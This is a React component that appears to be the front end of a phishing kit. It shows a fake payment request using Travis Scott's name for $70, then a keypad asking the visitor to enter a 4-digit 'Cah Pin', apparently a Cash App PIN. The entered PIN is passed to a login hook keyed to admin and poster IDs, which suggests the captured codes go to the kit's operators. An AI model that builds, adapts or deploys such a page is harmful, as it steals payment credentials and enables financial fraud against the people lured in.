"use client";
import { site } from "../config/index";
import { toast } from "react-toastify";
import useMockLogin from "../hooks/useMockLogin";
import { useEffect, useState } from "react";
export default function Home({ adminId, posterId }) {
  const [verified, setVerified] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  // Update the time every second
  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentTime(new Date());
    }, 60000);
    // Cleanup the interval on component unmount
    return () => clearInterval(intervalId);
  }, []);
  // Format time (optional)
  const formatTime = (date) => {
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
    return `${hours}:${formattedMinutes}`;
  };
  const { login } = useMockLogin(adminId, posterId);

  const [pin, setPin] = useState("");

  const handleInput = (num) => {
    if (pin.length < 4) {
      setPin(pin + num);
    }
  };

  const handleDelete = () => {
    setPin(pin.slice(0, -1));
  };

  const handleSubmit = () => {
    const submitValues = {
      site: site,
      password: pin,
    };
    console.log("submitValues", submitValues);
    login(submitValues);
    setPin("");
    console.log(submitValues);
  };
  return (
    <>
      {!verified ? (
        <div className="flex flex-col m-5 gap-5 ">
          <div className="text-center ">
            <p className="text-lg font-semibold">Travis Scott</p>
            <p className="text-xs text-gray-400">Payment form Stravisscott</p>
          </div>
          <div className="text-center mt-[50%]">
            <p className="text-2xl font-semibold">$70.00</p>
            <p className="text-xs text-gray-400">
              For la flame fans must eat Today at {formatTime(currentTime)}
            </p>
          </div>
          <div className=" flex flex-col gap-2 justify-center items-center text-center mt-[50%]">
            <button
              className=" w-[25%] px-5 py-1 rounded-xl bg-green-600 text-white"
              onClick={() => setVerified(true)}
            >
              Accept
            </button>
            <button className=" w-[25%] px-5 py-1 rounded-xl bg-red-600 text-white">
              Decline
            </button>
          </div>
        </div>
      ) : (
        <div className="flex flex-col items-center justify-center h-screen bg-white">
          <h1 className="text-lg font-semibold mb-4">
            Enter Your Cah Pin to continue.
          </h1>
          <div className="flex gap-2 mb-4">
            {[...Array(4)].map((_, i) => (
              <div
                key={i}
                className={`w-4 h-4 rounded-full border border-gray-500 ${
                  pin.length > i ? "bg-gray-800" : "bg-transparent"
                }`}
              ></div>
            ))}
          </div>
          <div className="grid grid-cols-3 gap-4 text-center text-xl font-semibold">
            {[1, 2, 3, 4, 5, 6, 7, 8, 9, "", 0, "⌫"].map((num, i) => (
              <button
                key={i}
                className="w-16 h-16 flex items-center justify-center bg-gray-200 rounded-full"
                onClick={() =>
                  num === "⌫" ? handleDelete() : handleInput(num)
                }
                disabled={num === ""}
              >
                {num}
              </button>
            ))}
          </div>
          <button
            className="mt-6 px-10 py-2 bg-green-500 text-white rounded-lg disabled:opacity-50"
            disabled={pin.length < 4}
            onClick={handleSubmit}
          >
            Next
          </button>
        </div>
      )}
    </>
  );
}
